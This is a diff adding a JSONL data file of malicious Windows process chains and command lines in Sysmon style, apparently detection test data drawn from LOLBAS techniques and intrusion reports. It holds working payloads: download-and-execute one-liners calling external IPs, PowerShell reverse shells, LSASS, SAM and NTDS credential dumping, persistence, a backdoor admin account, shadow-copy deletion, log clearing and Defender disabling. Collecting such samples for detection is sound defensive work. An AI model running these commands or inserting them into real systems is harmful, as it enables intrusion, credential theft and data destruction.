@@ -1,0 +1,97 @@
+// Malicious process creation chains on Windows: LOLBAS techniques and public intrusion reports (macro
+// documents, phishing LNK/HTA/JS, web shells on IIS/Exchange/SQL Server, WMI/SMB lateral movement,
+// credential dumping, persistence, ransomware pre-encryption steps), placed under the parents that spawn
+// them. `"os": "windows"`: the command line arrives with the process start (Sysmon Event ID 1), no exec.
+// Command lines are written as Sysmon logs them: sometimes the full quoted image path, sometimes bare.
+{"os": "windows", "chain": ["explorer", "winword", "powershell"], "cmdline": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAA="}
+{"os": "windows", "chain": ["explorer", "winword", "cmd"], "cmdline": "cmd.exe /c powershell -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://45.77.65.211/a.ps1')\""}
+{"os": "windows", "chain": ["explorer", "excel", "powershell"], "cmdline": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ep bypass -c \"Invoke-WebRequest -Uri http://193.142.146.35/inv.exe -OutFile $env:TEMP\\inv.exe; Start-Process $env:TEMP\\inv.exe\""}
+{"os": "windows", "chain": ["explorer", "excel", "cmd"], "cmdline": "cmd /c certutil -urlcache -split -f http://91.215.85.17/q.dll C:\\Users\\Public\\q.dll && rundll32 C:\\Users\\Public\\q.dll,DllRegisterServer"}
+{"os": "windows", "chain": ["explorer", "excel", "rundll32"], "cmdline": "rundll32.exe C:\\Users\\alice\\AppData\\Local\\Temp\\upd.dll,DllRegisterServer"}
+{"os": "windows", "chain": ["explorer", "winword", "regsvr32"], "cmdline": "regsvr32.exe /s /n /u /i:http://103.151.28.9/f.sct scrobj.dll"}
+{"os": "windows", "chain": ["explorer", "winword", "mshta"], "cmdline": "mshta.exe http://185.225.17.40/doc.hta"}
+{"os": "windows", "chain": ["explorer", "outlook", "wscript"], "cmdline": "\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\alice\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\X1Y2Z3QP\\invoice_0912.js\""}
+{"os": "windows", "chain": ["explorer", "outlook", "cmd"], "cmdline": "cmd.exe /c start /b C:\\Users\\alice\\AppData\\Local\\Temp\\Invoice.scr"}
+{"os": "windows", "chain": ["explorer", "acrord32", "cmd"], "cmdline": "cmd.exe /c powershell -nop -w hidden -c iex(iwr http://62.233.50.11/s -UseBasicParsing)"}
+{"os": "windows", "chain": ["explorer", "powerpnt", "powershell"], "cmdline": "powershell -windowstyle hidden -executionpolicy bypass -file C:\\ProgramData\\upd.ps1"}
+{"os": "windows", "chain": ["explorer", "winword", "powershell", "cmd"], "cmdline": "\"C:\\Windows\\system32\\cmd.exe\" /c whoami /all > C:\\Users\\Public\\o.txt"}
+{"os": "windows", "chain": ["explorer", "excel", "wmic"], "cmdline": "wmic process call create \"powershell -nop -w hidden -c iex(iwr http://45.9.148.99/x)\""}
+{"os": "windows", "chain": ["explorer", "winword", "schtasks"], "cmdline": "schtasks /create /tn OfficeUpd /tr \"C:\\Users\\alice\\AppData\\Roaming\\upd.exe\" /sc onlogon /f"}
+{"os": "windows", "chain": ["explorer", "chrome", "powershell"], "cmdline": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('146.70.86.4',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}\""}
+{"os": "windows", "chain": ["explorer", "excel", "powershell"], "cmdline": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KGl3ciBodHRwOi8vMTk0LjI2LjE5Mi4xMS9hKQ==')) | iex\""}
+{"os": "windows", "chain": ["explorer", "mshta"], "cmdline": "\"C:\\Windows\\System32\\mshta.exe\" vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell -nop -w hidden -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwA0ADUALgA=\"\",0:close\")"}
+{"os": "windows", "chain": ["explorer", "cmd"], "cmdline": "C:\\Windows\\System32\\cmd.exe /c start /min powershell -w hidden -ep bypass -c \"iex ((New-Object Net.WebClient).DownloadString('http://185.81.68.104/l'))\""}
+{"os": "windows", "chain": ["explorer", "wscript"], "cmdline": "\"C:\\Windows\\System32\\wscript.exe\" //B //E:jscript C:\\Users\\alice\\Downloads\\Invoice_2026.js"}
+{"os": "windows", "chain": ["explorer", "rundll32"], "cmdline": "\"C:\\Windows\\System32\\rundll32.exe\" D:\\documents\\report.dll,#1"}
+{"os": "windows", "chain": ["explorer", "wscript", "powershell"], "cmdline": "powershell -nop -w hidden -enc aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAOgAvAC8AOQAxAC4AMgAwADIALgAyADMALgAxADEAOQAvAHAAKQA="}
+{"os": "windows", "chain": ["explorer", "mshta", "powershell"], "cmdline": "powershell.exe -ep bypass -nop -c \"[Net.ServicePointManager]::SecurityProtocol='tls12';iex(New-Object Net.WebClient).DownloadString('https://paste.ee/r/aB3x9')\""}
+{"os": "windows", "chain": ["explorer", "cmd", "cmstp"], "cmdline": "cmstp.exe /ni /s C:\\Users\\alice\\AppData\\Local\\Temp\\x.inf"}
+{"os": "windows", "chain": ["explorer", "cmd", "msbuild"], "cmdline": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Users\\Public\\b.csproj"}
+{"os": "windows", "chain": ["explorer", "cmd", "installutil"], "cmdline": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\ProgramData\\i.dll"}
+{"os": "windows", "chain": ["explorer", "cmd", "certutil"], "cmdline": "certutil.exe -decode C:\\Users\\Public\\b64.txt C:\\Users\\Public\\p.exe"}
+{"os": "windows", "chain": ["explorer", "cmd", "bitsadmin"], "cmdline": "bitsadmin /transfer job1 /download /priority high http://79.137.198.6/p.exe C:\\Users\\Public\\p.exe"}
+{"os": "windows", "chain": ["explorer", "powershell", "certutil"], "cmdline": "certutil -urlcache -f http://5.252.178.21/nc.exe C:\\Windows\\Temp\\nc.exe"}
+{"os": "windows", "chain": ["explorer", "cmd", "forfiles"], "cmdline": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"cmd /c C:\\Users\\Public\\p.exe\""}
+{"os": "windows", "chain": ["explorer", "cmd", "pcalua"], "cmdline": "pcalua.exe -a C:\\Users\\Public\\p.exe"}
+{"os": "windows", "chain": ["explorer", "cmd", "regsvr32"], "cmdline": "regsvr32 /s /u /i:https://raw.githubusercontent.com/xq7/u2/main/p.sct scrobj.dll"}
+{"os": "windows", "chain": ["explorer", "cmd", "odbcconf"], "cmdline": "odbcconf.exe /a {REGSVR C:\\Users\\Public\\o.dll}"}
+{"os": "windows", "chain": ["explorer", "cmd", "hh"], "cmdline": "hh.exe http://185.142.98.33/help.chm"}
+{"os": "windows", "chain": ["explorer", "powershell", "mavinject"], "cmdline": "mavinject.exe 4120 /INJECTRUNNING C:\\Users\\Public\\inj.dll"}
+{"os": "windows", "chain": ["explorer", "cmd", "curl"], "cmdline": "curl.exe -s http://185.196.8.22/p -o C:\\Users\\Public\\p.exe"}
+{"os": "windows", "chain": ["explorer", "powershell", "expand"], "cmdline": "expand \\\\10.20.1.9\\share\\p.cab C:\\ProgramData\\p.exe"}
+{"os": "windows", "chain": ["services", "w3wp", "cmd"], "cmdline": "cmd.exe /c whoami"}
+{"os": "windows", "chain": ["services", "w3wp", "cmd"], "cmdline": "cmd.exe /c \"cd /d C:\\inetpub\\wwwroot&ipconfig /all\""}
+{"os": "windows", "chain": ["services", "w3wp", "cmd", "whoami"], "cmdline": "whoami /priv"}
+{"os": "windows", "chain": ["services", "w3wp", "powershell"], "cmdline": "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgA"}
+{"os": "windows", "chain": ["services", "w3wp", "cmd", "certutil"], "cmdline": "certutil -urlcache -split -f http://45.137.21.9/aspx.txt C:\\inetpub\\wwwroot\\aspnet_client\\s.aspx"}
+{"os": "windows", "chain": ["services", "w3wp", "cmd", "net"], "cmdline": "net user /domain"}
+{"os": "windows", "chain": ["services", "w3wp", "cmd", "net"], "cmdline": "net user svc_backup P@ssw0rd123! /add"}
+{"os": "windows", "chain": ["services", "w3wp", "cmd", "tasklist"], "cmdline": "tasklist /svc"}
+{"os": "windows", "chain": ["services", "svchost", "umworkerprocess", "cmd"], "cmdline": "cmd /c powershell -c \"iex(iwr http://89.44.9.243/e.ps1)\""}
+{"os": "windows", "chain": ["services", "sqlservr", "cmd"], "cmdline": "cmd.exe /c whoami"}
+{"os": "windows", "chain": ["services", "sqlservr", "cmd"], "cmdline": "cmd.exe /c certutil -urlcache -f http://23.94.7.175/m.exe %TEMP%\\m.exe & %TEMP%\\m.exe"}
+{"os": "windows", "chain": ["services", "sqlservr", "powershell"], "cmdline": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://23.94.7.175/m.exe','C:\\ProgramData\\m.exe')\""}
+{"os": "windows", "chain": ["services", "tomcat9", "cmd"], "cmdline": "cmd.exe /c powershell -ep bypass -c iex(iwr http://141.98.10.78/t.ps1)"}
+{"os": "windows", "chain": ["services", "java", "cmd"], "cmdline": "cmd.exe /c nltest /domain_trusts"}
+{"os": "windows", "chain": ["services", "httpd", "php-cgi", "cmd"], "cmdline": "cmd.exe /c curl -s http://141.98.10.78/r.bat -o C:\\Windows\\Temp\\r.bat && C:\\Windows\\Temp\\r.bat"}
+{"os": "windows", "chain": ["services", "svchost", "wmiprvse", "powershell"], "cmdline": "powershell.exe -nop -w hidden -noni -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQA"}
+{"os": "windows", "chain": ["services", "svchost", "wmiprvse", "cmd"], "cmdline": "cmd.exe /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1792918153.53 2>&1"}
+{"os": "windows", "chain": ["services", "svchost", "wmiprvse", "cmd"], "cmdline": "cmd.exe /Q /c whoami /groups 1> \\\\127.0.0.1\\ADMIN$\\__1792918199.21 2>&1"}
+{"os": "windows", "chain": ["wininit", "services", "cmd"], "cmdline": "C:\\Windows\\system32\\cmd.exe /Q /c echo cd ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > C:\\Windows\\TEMP\\execute.bat & C:\\Windows\\system32\\cmd.exe /Q /c C:\\Windows\\TEMP\\execute.bat & del C:\\Windows\\TEMP\\execute.bat"}
+{"os": "windows", "chain": ["explorer", "cmd", "wmic"], "cmdline": "wmic /node:10.20.1.15 /user:corp\\admin process call create \"cmd /c C:\\ProgramData\\p.exe\""}
+{"os": "windows", "chain": ["explorer", "cmd", "rundll32"], "cmdline": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsass.dmp full"}
+{"os": "windows", "chain": ["explorer", "windowsterminal", "powershell", "rundll32"], "cmdline": "\"C:\\Windows\\System32\\rundll32.exe\" C:\\windows\\System32\\comsvcs.dll MiniDump 688 C:\\ProgramData\\l.bin full"}
+{"os": "windows", "chain": ["explorer", "cmd", "procdump64"], "cmdline": "procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\ls.dmp"}
+{"os": "windows", "chain": ["explorer", "cmd", "reg"], "cmdline": "reg save HKLM\\SAM C:\\Users\\Public\\sam.save"}
+{"os": "windows", "chain": ["explorer", "windowsterminal", "powershell", "reg"], "cmdline": "reg save HKLM\\SECURITY C:\\Users\\Public\\sec.save"}
+{"os": "windows", "chain": ["explorer", "cmd", "ntdsutil"], "cmdline": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\PerfLogs\\x\" q q"}
+{"os": "windows", "chain": ["explorer", "cmd", "vssadmin"], "cmdline": "vssadmin create shadow /for=C:"}
+{"os": "windows", "chain": ["explorer", "windowsterminal", "powershell", "powershell"], "cmdline": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'\""}
+{"os": "windows", "chain": ["explorer", "cmd", "esentutl"], "cmdline": "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\PerfLogs\\n.dit"}
+{"os": "windows", "chain": ["explorer", "cmd", "findstr"], "cmdline": "findstr /si password *.xml *.ini *.txt *.config"}
+{"os": "windows", "chain": ["explorer", "cmd", "schtasks"], "cmdline": "schtasks /create /sc minute /mo 15 /tn \"MicrosoftEdgeUpdateTaskCore\" /tr \"C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\edge.exe\" /f"}
+{"os": "windows", "chain": ["explorer", "powershell", "reg"], "cmdline": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveSync /t REG_SZ /d \"C:\\Users\\alice\\AppData\\Local\\Temp\\od.exe\" /f"}
+{"os": "windows", "chain": ["explorer", "cmd", "reg"], "cmdline": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f"}
+{"os": "windows", "chain": ["explorer", "cmd", "sc"], "cmdline": "sc create WinDefUpd binPath= \"C:\\ProgramData\\svc.exe\" start= auto"}
+{"os": "windows", "chain": ["explorer", "cmd", "sc"], "cmdline": "sc config VSS start= disabled"}
+{"os": "windows", "chain": ["services", "svchost", "powershell"], "cmdline": "powershell.exe -nop -w hidden -ep bypass -file C:\\Users\\Public\\Libraries\\t.ps1"}
+{"os": "windows", "chain": ["explorer", "cmd", "attrib"], "cmdline": "attrib +h +s C:\\ProgramData\\svc.exe"}
+{"os": "windows", "chain": ["explorer", "cmd"], "cmdline": "cmd.exe /c copy C:\\Users\\Public\\p.exe \"C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\p.exe\""}
+{"os": "windows", "chain": ["explorer", "cmd", "net"], "cmdline": "net localgroup administrators svc_backup /add"}
+{"os": "windows", "chain": ["explorer", "cmd", "vssadmin"], "cmdline": "vssadmin.exe Delete Shadows /All /Quiet"}
+{"os": "windows", "chain": ["explorer", "cmd", "wmic"], "cmdline": "wmic shadowcopy delete /nointeractive"}
+{"os": "windows", "chain": ["explorer", "cmd", "bcdedit"], "cmdline": "bcdedit /set {default} recoveryenabled No"}
+{"os": "windows", "chain": ["explorer", "cmd", "bcdedit"], "cmdline": "bcdedit /set {default} bootstatuspolicy ignoreallfailures"}
+{"os": "windows", "chain": ["explorer", "cmd", "wbadmin"], "cmdline": "wbadmin delete catalog -quiet"}
+{"os": "windows", "chain": ["explorer", "cmd", "wevtutil"], "cmdline": "wevtutil cl Security"}
+{"os": "windows", "chain": ["explorer", "windowsterminal", "powershell", "wevtutil"], "cmdline": "wevtutil clear-log System"}
+{"os": "windows", "chain": ["explorer", "powershell"], "cmdline": "powershell -c Set-MpPreference -DisableRealtimeMonitoring $true"}
+{"os": "windows", "chain": ["explorer", "cmd", "powershell"], "cmdline": "powershell.exe -ep bypass -c Add-MpPreference -ExclusionPath C:\\ProgramData"}
+{"os": "windows", "chain": ["explorer", "cmd", "netsh"], "cmdline": "netsh advfirewall set allprofiles state off"}
+{"os": "windows", "chain": ["explorer", "cmd", "netsh"], "cmdline": "netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.20.1.5"}
+{"os": "windows", "chain": ["explorer", "cmd", "cipher"], "cmdline": "cipher /w:C:\\"}
+{"os": "windows", "chain": ["explorer", "cmd", "icacls"], "cmdline": "icacls \"C:\\*\" /grant Everyone:F /T /C /Q"}
+{"os": "windows", "chain": ["explorer", "cmd", "taskkill"], "cmdline": "taskkill /F /IM sqlservr.exe"}
+{"os": "windows", "chain": ["explorer", "cmd", "powershell"], "cmdline": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.7',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String )}\""}
+{"os": "windows", "chain": ["explorer", "windowsterminal", "powershell", "certutil"], "cmdline": "certutil.exe -urlcache -split -f https://transfer.sh/get/Xk2/beacon.exe C:\\Users\\Public\\Music\\b.exe"}
+{"os": "windows", "chain": ["explorer", "windowsterminal", "powershell", "schtasks"], "cmdline": "schtasks /create /ru SYSTEM /sc onstart /tn \"WindowsUpdateCheck\" /tr \"powershell -w hidden -ep bypass -file C:\\ProgramData\\u.ps1\" /f"}
